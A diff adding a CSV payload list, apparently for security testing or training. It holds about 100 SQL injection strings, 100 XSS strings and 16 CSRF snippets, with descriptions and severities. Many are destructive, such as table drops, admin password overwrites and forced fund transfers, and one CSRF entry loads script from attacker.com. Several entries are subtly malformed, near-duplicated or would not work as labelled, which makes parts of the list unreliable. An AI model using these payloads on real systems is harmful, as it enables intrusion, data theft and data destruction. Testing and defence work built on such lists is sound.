@@ -1,0 +1,506 @@
+id,vulnerability,subtype,description,payload,context,severity
+sqli-001,sqli,tautology,Basic tautology-based SQL injection,' OR '1'='1,Login form username input,high
+sqli-002,sqli,union,Union-based SQL injection to extract data,"' UNION SELECT username, password FROM users--",Search input field,high
+sqli-003,sqli,blind-time,Blind SQL injection with time delay,'; WAITFOR DELAY '0:0:5'--,ID parameter in URL,medium
+sqli-004,sqli,error-based,Error-based SQL injection to reveal database version,"' AND 1=CONVERT(int,@@version)--",User ID input,medium
+sqli-005,sqli,boolean-blind,Boolean-based blind SQL injection,' AND 1=1--,Search field,medium
+sqli-006,sqli,stacked-queries,Stacked queries to execute multiple statements,'; DROP TABLE users--,User input in form,critical
+sqli-007,sqli,tautology,Using comment to truncate query,' OR 1=1--,Login password field,high
+sqli-008,sqli,tautology,Hex encoded payload,0x27 OR 0x31=0x31--,URL parameter,medium
+sqli-009,sqli,blind-time,Using sleep for blind time-based injection,'; SELECT pg_sleep(5)--,PostgreSQL ID parameter,medium
+sqli-010,sqli,error-based,Extracting database user with error-based injection,"' AND 1=CONVERT(int,USER())--",User input,medium
+sqli-011,sqli,boolean-blind,Blind boolean-based injection with AND condition,"' AND SUBSTRING(@@version,1,1)='5'--",Search input,medium
+sqli-012,sqli,tautology,Using OR with false condition to bypass filters,' OR 'a'='a,Login username,high
+sqli-013,sqli,tautology,Using double dash comment to truncate query,' OR 1=1-- -,Search field,high
+sqli-014,sqli,tautology,Using inline comment to bypass filters,'//OR//1=1--,Login form,high
+sqli-015,sqli,tautology,Using cast to bypass filters,' OR CAST('a' AS INT)=CAST('a' AS INT)--,User input,medium
+sqli-016,sqli,blind-time,Using sleep in MySQL for time-based blind injection,' OR SLEEP(5)--,ID parameter,medium
+sqli-017,sqli,error-based,Using extractvalue for error-based injection,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",User input,high
+sqli-018,sqli,error-based,Using updatexml for error-based injection,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",User input,high
+sqli-019,sqli,blind-time,Using sleep in PostgreSQL for time-based injection,'; SELECT pg_sleep(10)--,ID parameter,medium
+sqli-020,sqli,tautology,Using OR with false condition and comment,' OR 1=1#,Login form,high
+sqli-021,sqli,blind-time,Using OR with sleep for time delay in MySQL,' OR SLEEP(10)--,Search input,medium
+sqli-022,sqli,union,Using UNION SELECT with NULLs to bypass column count,"' UNION SELECT NULL, NULL, username, password FROM users--",Search field,high
+sqli-023,sqli,tautology,Using OR with false condition and inline comment,' OR 1=1/*,Login username,high
+sqli-024,sqli,boolean-blind,Using AND with subquery for blind boolean injection,' AND (SELECT COUNT(*) FROM users) > 0--,Search input,medium
+sqli-025,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL,' OR pg_sleep(7)--,ID parameter,medium
+sqli-026,sqli,union,Using UNION SELECT with database() function,"' UNION SELECT database(), NULL--",Search input,high
+sqli-027,sqli,blind-time,Using OR with sleep for time delay in SQL Server,'; WAITFOR DELAY '0:0:10'--,User ID input,medium
+sqli-028,sqli,tautology,Using OR with cast to bypass filters,' OR CAST(1 AS INT)=1--,Login form,medium
+sqli-029,sqli,boolean-blind,Using OR with substring for blind boolean injection,"' OR SUBSTRING(user(),1,1)='r'--",Search input,medium
+sqli-030,sqli,blind-time,Using OR with sleep for time delay in Oracle,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,User input,medium
+sqli-031,sqli,union,Using UNION SELECT with information_schema.tables,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,high
+sqli-032,sqli,blind-time,Using OR with sleep for time delay in SQLite,' OR (SELECT sleep(5))--,ID parameter,medium
+sqli-033,sqli,tautology,Using OR with hex encoded string,' OR 0x61646d696e=0x61646d696e--,Login username,medium
+sqli-034,sqli,blind-time,Using OR with sleep for time delay in MySQL with comment,' OR SLEEP(5)#,Search input,medium
+sqli-035,sqli,union,Using UNION SELECT with user() function,"' UNION SELECT user(), NULL--",Search input,high
+sqli-036,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with comment,' OR pg_sleep(3)--,ID parameter,medium
+sqli-037,sqli,blind-time,Using OR with sleep for time delay in SQL Server with comment,'; WAITFOR DELAY '0:0:3'--,User ID input,medium
+sqli-038,sqli,boolean-blind,Using OR with substring for blind boolean injection with comment,"' OR SUBSTRING(@@version,1,1)='5'--",Search input,medium
+sqli-039,sqli,blind-time,Using OR with sleep for time delay in Oracle with comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,User input,medium
+sqli-040,sqli,stacked-queries,Using stacked queries to insert data,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",User input,critical
+sqli-041,sqli,blind-time,Using OR with sleep for time delay in MySQL with inline comment,' OR SLEEP(8)/*,Search input,medium
+sqli-042,sqli,union,Using UNION SELECT to extract table names,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,high
+sqli-043,sqli,boolean-blind,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='a'/*",Login input,medium
+sqli-044,sqli,stacked-queries,Using stacked queries to update data,'; UPDATE users SET password='hacked' WHERE username='admin'--,User input,critical
+sqli-045,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with inline comment,' OR pg_sleep(6)/*,ID parameter,medium
+sqli-046,sqli,union,Using UNION SELECT to extract column names,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Search input,high
+sqli-047,sqli,tautology,Using OR with cast for tautology,' OR CAST('1' AS INT)=1--,Login form,medium
+sqli-048,sqli,blind-time,Using OR with sleep for time delay in SQL Server with inline comment,'; WAITFOR DELAY '0:0:7'/*,User ID input,medium
+sqli-049,sqli,boolean-blind,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='8'#",Search input,medium
+sqli-050,sqli,union,Using UNION SELECT to extract user(),"' UNION SELECT user(), NULL--",Search input,high
+sqli-051,sqli,blind-time,Using OR with sleep for time delay in Oracle with inline comment,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,User input,medium
+sqli-052,sqli,stacked-queries,Using stacked queries to delete data,'; DELETE FROM users WHERE username='guest'--,User input,critical
+sqli-053,sqli,tautology,Using OR with hex encoded tautology,' OR 0x31=0x31--,Login username,medium
+sqli-054,sqli,blind-time,Using OR with sleep for time delay in MySQL with hash comment,' OR SLEEP(9)#,Search input,medium
+sqli-055,sqli,union,Using UNION SELECT to extract schema names,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,high
+sqli-056,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with hash comment,' OR pg_sleep(4)#,ID parameter,medium
+sqli-057,sqli,tautology,Using OR with cast for tautology with inline comment,' OR CAST(1 AS INT)=1/*,Login form,medium
+sqli-058,sqli,boolean-blind,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='b'/*",Search input,medium
+sqli-059,sqli,union,Using UNION SELECT to extract current database,"' UNION SELECT database(), NULL--",Search input,high
+sqli-060,sqli,stacked-queries,Using stacked queries to create new user,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",User input,critical
+sqli-061,sqli,blind-time,Using OR with sleep for time delay in SQL Server with hash comment,'; WAITFOR DELAY '0:0:5'#,User ID input,medium
+sqli-062,sqli,boolean-blind,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='9'#",Search input,medium
+sqli-063,sqli,union,Using UNION SELECT to extract user privileges,"' UNION SELECT user(), NULL--",Search input,high
+sqli-064,sqli,blind-time,Using OR with sleep for time delay in Oracle with hash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,User input,medium
+sqli-065,sqli,stacked-queries,Using stacked queries to drop table,'; DROP TABLE sessions--,User input,critical
+sqli-066,sqli,tautology,Using OR with hex encoded tautology with comment,' OR 0x41=0x41--,Login username,medium
+sqli-067,sqli,blind-time,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(11)--,Search input,medium
+sqli-068,sqli,union,Using UNION SELECT to extract schema names with comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,high
+sqli-069,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(12)--,ID parameter,medium
+sqli-070,sqli,stacked-queries,Using stacked queries to update admin password,'; UPDATE users SET password='newpass' WHERE username='admin'--,User input,critical
+sqli-071,sqli,blind-time,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(12)--,Search input,medium
+sqli-072,sqli,union,Using UNION SELECT to extract column names with comment,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Search input,high
+sqli-073,sqli,boolean-blind,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='c'--",Login input,medium
+sqli-074,sqli,stacked-queries,Using stacked queries to insert admin user,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",User input,critical
+sqli-075,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(8)--,ID parameter,medium
+sqli-076,sqli,union,Using UNION SELECT to extract database version,"' UNION SELECT @@version, NULL--",Search input,high
+sqli-077,sqli,tautology,Using OR with cast for tautology with double dash comment,' OR CAST('1' AS INT)=1--,Login form,medium
+sqli-078,sqli,blind-time,Using OR with sleep for time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:8'--,User ID input,medium
+sqli-079,sqli,boolean-blind,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='7'--",Search input,medium
+sqli-080,sqli,union,Using UNION SELECT to extract current user,"' UNION SELECT user(), NULL--",Search input,high
+sqli-081,sqli,blind-time,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,User input,medium
+sqli-082,sqli,stacked-queries,Using stacked queries to delete admin user,'; DELETE FROM users WHERE username='admin'--,User input,critical
+sqli-083,sqli,tautology,Using OR with hex encoded tautology with double dash comment,' OR 0x42=0x42--,Login username,medium
+sqli-084,sqli,blind-time,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(13)--,Search input,medium
+sqli-085,sqli,union,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,high
+sqli-086,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(14)--,ID parameter,medium
+sqli-087,sqli,tautology,Using OR with cast for tautology with double dash comment,' OR CAST(1 AS INT)=1--,Login form,medium
+sqli-088,sqli,boolean-blind,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='d'--",Search input,medium
+sqli-089,sqli,union,Using UNION SELECT to extract current database with double dash comment,"' UNION SELECT database(), NULL--",Search input,high
+sqli-090,sqli,stacked-queries,Using stacked queries to create new admin user,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",User input,critical
+sqli-091,sqli,blind-time,Using OR with sleepfor time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:9'--,User ID input,medium
+sqli-092,sqli,boolean-blind,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='6'--",Search input,medium
+sqli-093,sqli,union,Using UNION SELECT to extract user privileges with double dash comment,"' UNION SELECT user(), NULL--",Search input,high
+sqli-094,sqli,blind-time,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,User input,medium
+sqli-095,sqli,stacked-queries,Using stacked queries to drop sessions table,'; DROP TABLE sessions--,User input,critical
+sqli-096,sqli,tautology,Using OR with hex encoded tautology with double dash comment,' OR 0x43=0x43--,Login username,medium
+sqli-097,sqli,blind-time,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(14)--,Search input,medium
+sqli-098,sqli,union,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,high
+sqli-099,sqli,blind-time,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(15)--,ID parameter,medium
+sqli-100,sqli,stacked-queries,Using stacked queries to update admin password with double dash comment,'; UPDATE users SET password='securepass' WHERE username='admin'--,User input,critical
+xss-001,xss,reflected,Basic reflected XSS with script tag,<script>alert('XSS1')</script>,URL parameter,high
+xss-002,xss,reflected,Reflected XSS with image tag and onerror event,<img src=x onerror=alert('XSS2')>,URL parameter,high
+xss-003,xss,stored,Stored XSS with script tag in comment field,<script>alert('XSS3')</script>,Comment input,high
+xss-004,xss,reflected,Reflected XSS with javascript: URI in anchor tag,"<a href='javascript:alert(""XSS4"")'>click</a>",URL parameter,high
+xss-005,xss,reflected,Reflected XSS with input tag and onfocus event,<input autofocus onfocus=alert('XSS5')>,URL parameter,high
+xss-006,xss,stored,Stored XSS with iframe tag,"<iframe src='javascript:alert(""XSS6"")'></iframe>",User profile bio,high
+xss-007,xss,reflected,Reflected XSS with SVG and onload event,<svg onload=alert('XSS7')>,URL parameter,high
+xss-008,xss,reflected,Reflected XSS with body tag and onload event,<body onload=alert('XSS8')>,URL parameter,high
+xss-009,xss,stored,Stored XSS with event handler in div tag,<div onclick=alert('XSS9')>Click me</div>,User input field,high
+xss-010,xss,reflected,Reflected XSS with meta refresh tag,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",URL parameter,high
+xss-011,xss,reflected,Reflected XSS with style tag and expression,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",URL parameter,high
+xss-012,xss,reflected,Reflected XSS with script tag and encoded payload,%3Cscript%3Ealert('XSS12')%3C/script%3E,URL parameter,high
+xss-013,xss,stored,Stored XSS with onmouseover event in span tag,<span onmouseover=alert('XSS13')>Hover me</span>,User input field,high
+xss-014,xss,reflected,Reflected XSS with iframe and srcdoc attribute,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",URL parameter,high
+xss-015,xss,reflected,Reflected XSS with object tag and data attribute,"<object data='javascript:alert(""XSS15"")'></object>",URL parameter,high
+xss-016,xss,stored,Stored XSS with form tag and onsubmit event,<form onsubmit=alert('XSS16')><input type='submit'></form>,User input field,high
+xss-017,xss,reflected,Reflected XSS with video tag and onerror event,<video src=x onerror=alert('XSS17')></video>,URL parameter,high
+xss-018,xss,reflected,Reflected XSS with audio tag and onerror event,<audio src=x onerror=alert('XSS18')></audio>,URL parameter,high
+xss-019,xss,stored,Stored XSS with textarea and onfocus event,<textarea onfocus=alert('XSS19')>Focus me</textarea>,User input field,high
+xss-020,xss,reflected,Reflected XSS with math tag and href attribute,"<math href='javascript:alert(""XSS20"")'>X</math>",URL parameter,high
+xss-021,xss,reflected,Reflected XSS with base tag and href attribute,"<base href=""javascript:alert('XSS21');//"">",URL parameter,high
+xss-022,xss,stored,Stored XSS with anchor tag and onclick event,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",User input field,high
+xss-023,xss,reflected,Reflected XSS with meta tag and content attribute,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",URL parameter,high
+xss-024,xss,stored,Stored XSS with button tag and onclick event,"<button onclick='alert(""XSS24"")'>Click</button>",User input field,high
+xss-025,xss,reflected,Reflected XSS with form tag and onreset event,<form onreset=alert('XSS25')><input type='reset'></form>,URL parameter,high
+xss-026,xss,stored,Stored XSS with marquee tag and onstart event,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,User input field,high
+xss-027,xss,reflected,Reflected XSS with embed tag and src attribute,"<embed src='javascript:alert(""XSS27"")'>",URL parameter,high
+xss-028,xss,stored,Stored XSS with bgsound tag and src attribute,"<bgsound src='javascript:alert(""XSS28"")'>",User input field,high
+xss-029,xss,reflected,Reflected XSS with xml tag and onload event,<xml onload=alert('XSS29')>,URL parameter,high
+xss-030,xss,stored,Stored XSS with iframe and onload event,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>",User input field,high
+xss-031,xss,reflected,Reflected XSS using SVG with animate element and begin attribute,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,URL parameter,high
+xss-032,xss,stored,Stored XSS using JavaScript URI in base tag,"<base href=""javascript:alert('XSS32');//"">",User profile input,high
+xss-033,xss,reflected,Reflected XSS using malformed iframe with srcdoc and encoded script,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,URL parameter,high
+xss-034,xss,stored,Stored XSS using onpointerover event in div,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",User input field,high
+xss-035,xss,reflected,Reflected XSS using malformed script tag with backticks,<script>alert(XSS35)</script>,URL parameter,high
+xss-036,xss,stored,Stored XSS using SVG foreignObject with embedded HTML and script,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,User input field,high
+xss-037,xss,reflected,Reflected XSS using onanimationstart event in div,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",URL parameter,high
+xss-038,xss,stored,Stored XSS using input tag with oninput event,"<input oninput='alert(""XSS38"")'>",User input field,high
+xss-039,xss,reflected,Reflected XSS using malformed script with template literals,<script>eval(alert('XSS39'))</script>,URL parameter,high
+xss-040,xss,stored,Stored XSS using object tag with data URI,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",User input field,high
+xss-041,xss,reflected,Reflected XSS using onpointerdown event in span,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",URL parameter,high
+xss-042,xss,stored,Stored XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS42"")'>X</math>",User input field,high
+xss-043,xss,reflected,Reflected XSS using iframe with sandbox attribute bypass,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",URL parameter,high
+xss-044,xss,stored,Stored XSS using video tag with oncanplay event,"<video oncanplay='alert(""XSS44"")'></video>",User input field,high
+xss-045,xss,reflected,Reflected XSS using meta tag with refresh and encoded javascript URI,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",URL parameter,high
+xss-046,xss,stored,Stored XSS using svg with set attribute and onbegin event,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",User input field,high
+xss-047,xss,reflected,Reflected XSS using malformed script with setTimeout,"<script>setTimeout('alert(""XSS47"")',0)</script>",URL parameter,high
+xss-048,xss,stored,Stored XSS using details tag with ontoggle event,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>",User input field,high
+xss-049,xss,reflected,Reflected XSS using input tag with formaction attribute,"<input formaction='javascript:alert(""XSS49"")' type='submit'>",URL parameter,high
+xss-050,xss,stored,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>",User input field,high
+xss-051,xss,reflected,Reflected XSS using script tag with setInterval,"<script>setInterval(function(){alert('XSS51')},1000)</script>",URL parameter,high
+xss-052,xss,stored,Stored XSS using iframe with onload and srcdoc,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>",User input field,high
+xss-053,xss,reflected,Reflected XSS using svg with onload and script tag,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>",URL parameter,high
+xss-054,xss,stored,Stored XSS using iframe with src set to javascript URI,"<iframe src='javascript:alert(""XSS54"")'></iframe>",User input field,high
+xss-055,xss,reflected,Reflected XSS using object tag with type attribute and data URI,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>",URL parameter,high
+xss-056,xss,stored,Stored XSS using svg with onload and setTimeout,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>",User input field,high
+xss-057,xss,reflected,Reflected XSS using iframe with srcdoc and encoded script,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>",URL parameter,high
+xss-058,xss,stored,Stored XSS using svg with animateTransform and onbegin event,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>",User input field,high
+xss-059,xss,reflected,Reflected XSS using script tag with Function constructor,"<script>Function('alert(""XSS59"")')()</script>",URL parameter,high
+xss-060,xss,stored,Stored XSS using iframe with onload and encoded srcdoc,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>",User input field,high
+xss-061,xss,reflected,Reflected XSS using SVG with feImage and onload event,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>,URL parameter,high
+xss-062,xss,stored,Stored XSS using details tag with ontoggle event and script,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>",User input field,high
+xss-063,xss,reflected,Reflected XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS63"")'>X</math>",URL parameter,high
+xss-064,xss,stored,Stored XSS using audio tag with onerror event,"<audio src='x' onerror='alert(""XSS64"")'></audio>",User input field,high
+xss-065,xss,reflected,Reflected XSS using iframe with srcdoc and onload event,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>",URL parameter,high
+xss-066,xss,stored,Stored XSS using svg with animateMotion and onbegin event,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>",User input field,high
+xss-067,xss,reflected,Reflected XSS using input tag with oninvalid event,"<input oninvalid='alert(""XSS67"")' required>",URL parameter,high
+xss-068,xss,stored,Stored XSS using iframe with allow attribute and srcdoc,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>",User input field,high
+xss-069,xss,reflected,Reflected XSS using svg with onfocusin event,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>",URL parameter,high
+xss-070,xss,stored,Stored XSS using video tag with onpause event,"<video onpause='alert(""XSS70"")'></video>",User input field,high
+xss-071,xss,reflected,Reflected XSS using svg with onmouseenter event,"<svg onmouseenter='alert(""XSS71"")'></svg>",URL parameter,high
+xss-072,xss,stored,Stored XSS using form tag with oninput event,"<form oninput='alert(""XSS72"")'><input></form>",User input field,high
+xss-073,xss,reflected,Reflected XSS using svg with onwheel event,"<svg onwheel='alert(""XSS73"")'></svg>",URL parameter,high
+xss-074,xss,stored,Stored XSS using iframe with allowfullscreen attribute and onload event,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>",User input field,high
+xss-075,xss,reflected,Reflected XSS using svg with onanimationend event,"<svg onanimationend='alert(""XSS75"")'></svg>",URL parameter,high
+xss-076,xss,stored,Stored XSS using audio tag with onplay event,"<audio onplay='alert(""XSS76"")'></audio>",User input field,high
+xss-077,xss,reflected,Reflected XSS using svg with onscroll event,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>",URL parameter,high
+xss-078,xss,stored,Stored XSS using iframe with seamless attribute and onload event,"<iframe seamless onload='alert(""XSS78"")'></iframe>",User input field,high
+xss-079,xss,reflected,Reflected XSS using svg with oncut event,"<svg oncut='alert(""XSS79"")'></svg>",URL parameter,high
+xss-080,xss,stored,Stored XSS using svg with oncopy event,"<svg oncopy='alert(""XSS80"")'></svg>",User input field,high
+xss-081,xss,reflected,Reflected XSS using svg with onpaste event,"<svg onpaste='alert(""XSS81"")'></svg>",URL parameter,high
+xss-082,xss,stored,Stored XSS using svg with onreset event,"<svg onreset='alert(""XSS82"")'></svg>",User input field,high
+xss-083,xss,reflected,Reflected XSS using svg with onsearch event,"<svg onsearch='alert(""XSS83"")'></svg>",URL parameter,high
+xss-084,xss,stored,Stored XSS using svg with onselect event,"<svg onselect='alert(""XSS84"")'></svg>",User input field,high
+xss-085,xss,reflected,Reflected XSS using svg with onshow event,"<svg onshow='alert(""XSS85"")'></svg>",URL parameter,high
+xss-086,xss,stored,Stored XSS using svg with ontoggle event,"<svg ontoggle='alert(""XSS86"")'></svg>",User input field,high
+xss-087,xss,reflected,Reflected XSS using svg with ontransitionend event,"<svg ontransitionend='alert(""XSS87"")'></svg>",URL parameter,high
+xss-088,xss,stored,Stored XSS using svg with onunload event,"<svg onunload='alert(""XSS88"")'></svg>",User input field,high
+xss-089,xss,reflected,Reflected XSS using svg with onvolumechange event,"<svg onvolumechange='alert(""XSS89"")'></svg>",URL parameter,high
+xss-090,xss,stored,Stored XSS using svg with onwaiting event,"<svg onwaiting='alert(""XSS90"")'></svg>",User input field,high
+xss-091,xss,reflected,Reflected XSS using svg with onwheel event and CSS animation,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>",URL parameter,high
+xss-092,xss,stored,Stored XSS using svg with onpointercancel event,"<svg onpointercancel='alert(""XSS92"")'></svg>",User input field,high
+xss-093,xss,reflected,Reflected XSS using svg with onpointerout event,"<svg onpointerout='alert(""XSS93"")'></svg>",URL parameter,high
+xss-094,xss,stored,Stored XSS using svg with onpointerover event,"<svg onpointerover='alert(""XSS94"")'></svg>",User input field,high
+xss-095,xss,reflected,Reflected XSS using svg with onpointerup event,"<svg onpointerup='alert(""XSS95"")'></svg>",URL parameter,high
+xss-096,xss,stored,Stored XSS using svg with onselectstart event,"<svg onselectstart='alert(""XSS96"")'></svg>",User input field,high
+xss-097,xss,reflected,Reflected XSS using svg with onshow event and tabindex,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>",URL parameter,high
+xss-098,xss,stored,Stored XSS using svg with onstalled event,"<svg onstalled='alert(""XSS98"")'></svg>",User input field,high
+xss-099,xss,reflected,Reflected XSS using svg with onsubmit event,"<svg onsubmit='alert(""XSS99"")'></svg>",URL parameter,high
+xss-100,xss,stored,Stored XSS using svg with onunload event and script,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>",User input field,high
+csrf-001,csrf,CSRF,CSRF using auto-submitting hidden form with POST method,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,high
+csrf-002,csrf,CSRF,CSRF using image tag with GET request,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>,Malicious webpage,medium
+csrf-003,csrf,CSRF,CSRF using XMLHttpRequest with credentials,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>",Malicious webpage,high
+csrf-004,csrf,CSRF,CSRF using fetch API with credentials,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>",Malicious webpage,high
+csrf-005,csrf,CSRF,CSRF using auto-submitting form with file upload,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>,Malicious webpage,medium
+csrf-006,csrf,CSRF,CSRF using meta refresh redirect with GET request,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>,Malicious webpage,medium
+csrf-007,csrf,CSRF,CSRF using script tag to load external script triggering action,<script src='https://attacker.com/csrf-trigger.js'></script>,Malicious webpage,high
+csrf-008,csrf,CSRF,CSRF using iframe with auto-submitting form inside,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>",Malicious webpage,high
+csrf-009,csrf,CSRF,CSRF using SVG with embedded script and form submission,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>,Malicious webpage,high
+csrf-010,csrf,CSRF,CSRF using beacon API to send POST request,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>",Malicious webpage,medium
+csrf-011,csrf,CSRF,CSRF using form with onsubmit event to modify data,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>",Malicious webpage,high
+csrf-012,csrf,CSRF,CSRF using image with onerror event to trigger XMLHttpRequest,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">",Malicious webpage,high
+csrf-013,csrf,CSRF,CSRF using form with hidden inputs and auto-submit,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,high
+csrf-014,csrf,CSRF,CSRF using fetch with POST and custom headers,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>",Malicious webpage,high
+csrf-015,csrf,CSRF,CSRF using form with enctype multipart/form-data,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>,Malicious webpage,medium
+csrf-016,csrf,CSRF,CSRF using script with setTimeout to delay request,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>",Malicious webpage,high
